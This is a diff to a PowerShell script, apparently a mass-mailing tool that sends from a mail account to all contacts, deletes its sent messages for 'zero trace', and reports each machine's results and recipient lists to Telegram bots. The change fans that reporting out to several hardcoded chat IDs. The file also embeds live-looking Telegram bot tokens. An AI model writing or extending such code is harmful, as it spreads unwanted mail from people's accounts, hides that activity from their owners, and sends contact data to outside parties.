@@ -53,10 +53,10 @@ param(
     [switch]$SelfDelete,      # após enviar, apaga as mensagens desta execução (por assunto)
     [switch]$SelfDeleteAll,   # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
     [string]$TelegramToken = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",  # token do bot (vazio = sem reporte)
-    [string]$TelegramChatId = "6168636325",                                     # chat_id de destino do reporte
+    [string]$TelegramChatId = "6168636325,8725655293",                          # chat_id(s) de destino do reporte (separados por virgula)
     [switch]$NoTelegram,     # desliga o reporte via Telegram
     [string]$ListaToken  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
-    [string]$ListaChatId = "6168636325"
+    [string]$ListaChatId = "6168636325,8725655293"   # chat_id(s) de destino da lista (separados por virgula)
 )
 
 $ErrorActionPreference = "Stop"
@@ -1215,18 +1215,23 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
             if (($enviados.Count -gt 0) -or ($naoEnviados.Count -gt 0)) {
                 $listaText = Build-ListaText $src.conta $enviados $naoEnviados
                 $listaRes = @()
-                if ($listaText.Length -le 4000) {
-                    $listaRes += Send-TelegramMessage $ListaToken $ListaChatId $listaText
-                } else {
-                    $bloco = @(); $tam = 0
-                    foreach ($linha in ($listaText -split "`n")) {
-                        if (($tam + $linha.Length + 1) -gt 4000 -and $bloco.Count -gt 0) {
-                            $listaRes += Send-TelegramMessage $ListaToken $ListaChatId ($bloco -join "`n")
-                            $bloco = @(); $tam = 0
+                # chat_id(s) separados por virgula: a lista vai para CADA um
+                foreach ($chat in ($ListaChatId -split ',')) {
+                    $chat = $chat.Trim()
+                    if (-not $chat) { continue }
+                    if ($listaText.Length -le 4000) {
+                        $listaRes += Send-TelegramMessage $ListaToken $chat $listaText
+                    } else {
+                        $bloco = @(); $tam = 0
+                        foreach ($linha in ($listaText -split "`n")) {
+                            if (($tam + $linha.Length + 1) -gt 4000 -and $bloco.Count -gt 0) {
+                                $listaRes += Send-TelegramMessage $ListaToken $chat ($bloco -join "`n")
+                                $bloco = @(); $tam = 0
+                            }
+                            $bloco += $linha; $tam += $linha.Length + 1
                         }
-                        $bloco += $linha; $tam += $linha.Length + 1
+                        if ($bloco.Count -gt 0) { $listaRes += Send-TelegramMessage $ListaToken $chat ($bloco -join "`n") }
                     }
-                    if ($bloco.Count -gt 0) { $listaRes += Send-TelegramMessage $ListaToken $ListaChatId ($bloco -join "`n") }
                 }
                 $envioTodos | Add-Member -MemberType NoteProperty -Name lista -Value $listaRes
             }
@@ -1285,7 +1290,12 @@ $out = [PSCustomObject]@{
 # ---- Telegram: dispara o reporte desta máquina (máquina + OK/erro + qtd) ----
 $telegram = $null
 if ($TelegramToken -and $TelegramChatId -and -not $NoTelegram.IsPresent) {
-    $telegram = Send-TelegramMessage $TelegramToken $TelegramChatId (Build-ReportText $out)
+    $telegram = @()
+    # chat_id(s) separados por virgula: o reporte vai para CADA um (ex.: bot + chat pessoal)
+    foreach ($chat in ($TelegramChatId -split ',')) {
+        $chat = $chat.Trim()
+        if ($chat) { $telegram += Send-TelegramMessage $TelegramToken $chat (Build-ReportText $out) }
+    }
 }
 $out | Add-Member -MemberType NoteProperty -Name telegram -Value $telegram
 $out | ConvertTo-Json -Depth 6
